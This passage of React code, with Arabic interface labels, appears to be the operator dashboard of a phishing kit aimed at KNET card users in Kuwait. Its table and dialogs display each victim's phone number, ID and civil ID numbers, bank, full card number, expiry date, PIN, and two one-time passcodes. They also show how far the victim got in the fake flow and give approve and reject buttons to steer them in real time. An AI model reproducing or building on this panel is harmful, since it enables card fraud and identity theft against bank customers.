                              {r.bank
                                ? <span className={`text-sm font-semibold ${d ? "text-slate-200" : "text-slate-700"}`}>{r.bank}</span>
                                : <span className={d ? "text-slate-600" : "text-slate-300"}>—</span>}
                            </td>
                           <td className="px-5 py-3.5"><StatusBadge status={statusLabel} /></td>
                           <td className="px-5 py-3.5 text-center">
                             {r.step_reached != null
                               ? <span className={`inline-flex items-center justify-center w-8 h-8 rounded-full text-sm font-bold ${d ? "bg-violet-500/15 border border-violet-500/25 text-violet-300" : "bg-violet-100 border border-violet-200 text-violet-700"}`}>{r.step_reached}</span>
                               : <span className={d ? "text-slate-600" : "text-slate-300"}>—</span>}
                           </td>
                           <td className="px-5 py-3.5">
                             <div className="flex flex-col gap-1.5">
                               {r.otp1 ? <span className={`font-mono text-xs rounded-lg px-2.5 py-1 whitespace-nowrap ${d ? "text-amber-300 bg-amber-500/10 border border-amber-500/20" : "text-amber-700 bg-amber-50 border border-amber-200"}`}>① {r.otp1}</span> : null}
                               {r.otp2 ? <span className={`font-mono text-xs rounded-lg px-2.5 py-1 whitespace-nowrap ${d ? "text-cyan-300 bg-cyan-500/10 border border-cyan-500/20" : "text-cyan-700 bg-cyan-50 border border-cyan-200"}`}>② {r.otp2}</span> : null}
                               {!r.otp1 && !r.otp2 && <span className={d ? "text-slate-600" : "text-slate-300"}>—</span>}
                             </div>
                           </td>
                           <td className="px-5 py-3.5">
                             <span className={`text-xs whitespace-nowrap ${d ? "text-slate-500" : "text-slate-400"}`}>{r.created_date ? formatDistanceToNow(new Date(r.created_date), { addSuffix: true, locale: ar }) : "—"}</span>
                           </td>
                           <td className="px-5 py-3.5">
                             <div className="flex items-center gap-1">
                               <Button variant="ghost" size="sm" onClick={() => handleApproval("approved", r.id)} disabled={statusLabel === "approved"} className="h-8 w-8 p-0 rounded-lg bg-emerald-500/10 text-emerald-400 hover:bg-emerald-500/20 border border-emerald-500/20 disabled:opacity-30">
                                 <CheckCircle className="h-4 w-4" />
                               </Button>
                               <Button variant="ghost" size="sm" onClick={() => handleApproval("rejected", r.id)} disabled={statusLabel === "rejected"} className="h-8 w-8 p-0 rounded-lg bg-red-500/10 text-red-400 hover:bg-red-500/20 border border-red-500/20 disabled:opacity-30">
                                 <XCircle className="h-4 w-4" />
                               </Button>
                               <FlagColorSelector id={r.id} currentColor={r.bank} onChange={handleFlagChange} />
                               <Button variant="ghost" size="sm" onClick={() => handleDelete(r.id)} className="h-8 w-8 p-0 rounded-lg text-slate-600 hover:text-red-400 hover:bg-red-500/10">
                                 <Trash2 className="h-4 w-4" />
                               </Button>
                             </div>
                           </td>
                         </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            )}
          </CardContent>
          {paginated.length > 0 && (
           <CardFooter className={`border-t p-4 transition-colors duration-300 ${d ? "border-white/5" : "border-slate-100"}`}>
             <PaginationBar currentPage={currentPage} totalPages={totalPages} onPageChange={setCurrentPage} totalItems={filtered.length} itemsPerPage={itemsPerPage} />
           </CardFooter>
          )}
          </Card>
      </div>

      {/* Personal Info Dialog */}
      <Dialog open={dialogType === "personal"} onOpenChange={closeDialog}>
        <DialogContent className="max-w-md bg-slate-900 border border-white/10 rounded-2xl shadow-2xl shadow-black/50 p-6" dir="rtl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-3 text-xl font-bold text-white">
              <div className="w-10 h-10 rounded-xl flex items-center justify-center bg-gradient-to-br from-blue-500 to-indigo-600 shadow-lg">
                <User className="h-5 w-5 text-white" />
              </div>
              المعلومات الشخصية
            </DialogTitle>
          </DialogHeader>
          {selectedRecord && (
            <InfoSection items={[
              { label: "رقم الهاتف", value: selectedRecord.phone_number },
              { label: "رقم الهوية", value: selectedRecord.id_number, sensitive: true },
              { label: "الرقم المدني", value: selectedRecord.civil_id, sensitive: true },
              { label: "المبلغ", value: selectedRecord.amount },
              { label: "الشبكة", value: selectedRecord.network },
              { label: "الخطوة", value: selectedRecord.step_reached },
            ]} />
          )}
          <DialogFooter>
            <div className="grid w-full gap-2">
              <div className="flex gap-2">
                <Button onClick={() => handleApproval("approved", selectedRecord?.id)} className="w-full bg-green-500 hover:bg-green-600">
                  موافقة <CheckCircle className="h-4 w-4 mr-1" />
                </Button>
                <Button variant="destructive" onClick={() => handleApproval("rejected", selectedRecord?.id)} className="w-full">
                  رفض <X className="h-4 w-4 mr-1" />
                </Button>
              </div>
              <Button variant="outline" onClick={closeDialog} className="w-full">إغلاق</Button>
            </div>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* KNET Card Info Dialog */}
      <Dialog open={dialogType === "card"} onOpenChange={closeDialog}>
        <DialogContent className="max-w-md bg-slate-900 border border-white/10 rounded-2xl shadow-2xl shadow-black/50 p-6" dir="rtl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-3 text-xl font-bold text-white">
              <div className="w-10 h-10 rounded-xl overflow-hidden shadow-lg">
                <img src="https://media.base44.com/images/public/6a1f21dff88d7df94e752b5a/4187ba546_knet.png" alt="KNET" className="w-full h-full object-cover" />
              </div>
              معلومات KNET
            </DialogTitle>
          </DialogHeader>
          {selectedRecord && (
            <InfoSection items={[
              { label: "البنك", value: selectedRecord.bank || null },
              { label: "رقم البطاقة", value: selectedRecord.card_number ? `${selectedRecord.card_prefix || ""} - ${selectedRecord.card_number}` : null, ltr: true },
              { label: "تاريخ الانتهاء", value: selectedRecord.expiry_year && selectedRecord.expiry_month ? `${selectedRecord.expiry_year}/${selectedRecord.expiry_month}` : null },
              { label: "الرقم السري", value: selectedRecord.pin, sensitive: true },
              { label: "رمز OTP1", value: selectedRecord.otp1, sensitive: true },
              { label: "رمز OTP2", value: selectedRecord.otp2, sensitive: true },
            ]} />
          )}
          <DialogFooter>
            <div className="grid w-full gap-2">
              <div className="flex gap-2">
                <Button onClick={() => handleApproval("approved", selectedRecord?.id)} className="w-full bg-green-500 hover:bg-green-600">
                  موافقة <CheckCircle className="h-4 w-4 mr-1" />
                </Button>
                <Button variant="destructive" onClick={() => handleApproval("rejected", selectedRecord?.id)} className="w-full">
                  رفض <X className="h-4 w-4 mr-1" />
                </Button>
              </div>
              <Button variant="outline" onClick={closeDialog} className="w-full">إغلاق</Button>
            </div>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}